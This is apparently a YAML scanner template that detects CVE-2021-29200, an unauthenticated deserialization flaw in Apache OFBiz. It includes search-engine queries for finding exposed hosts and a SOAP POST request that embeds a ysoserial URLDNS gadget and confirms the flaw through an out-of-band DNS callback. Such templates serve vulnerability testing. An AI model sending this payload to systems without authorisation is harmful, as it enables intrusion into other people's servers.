id: CVE-2021-29200

info:
  name: Apache OFBiz < 17.12.07 - Arbitrary Code Execution
  author: your3cho
  severity: critical
  verified: true
  description: |-
    Apache OFBiz has unsafe deserialization prior to 17.12.07 version An unauthenticated user can perform an RCE attack
    fofa: app="Apache_OFBiz"
    hunter: app.name="OFBiz"
    zoomeye: app:"Apache OFBiz"
  reference:
    - http://www.openwall.com/lists/oss-security/2021/04/27/4
    - https://nvd.nist.gov/vuln/detail/CVE-2021-29200
    - https://github.com/freeide/CVE-2021-29200
  tags: cve,cve2021,apache,ofbiz,deserialization,rce
  created: 2024/01/05

set:
  oob: oob()
  oobDNS: oob.DNS
  base64payload: ysoserial("URLDNS",oobDNS,"hex")
rules:
  r0:
    request:
      method: POST
      path: /webtools/control/SOAPService
      headers:
        Content-Type: application/xml
      body: |
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header/>
            <soapenv:Body>
              <ser>
                <map-HashMap>
                  <map-Entry>
                    <map-Key>
                      <cus-obj>{{base64payload}}</cus-obj>
                    </map-Key>
                    <map-Value>
                      <std-String value="STDSTRING"/>
                    </map-Value>
                  </map-Entry>
                </map-HashMap>
             </ser>
          </soapenv:Body>
        </soapenv:Envelope>
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
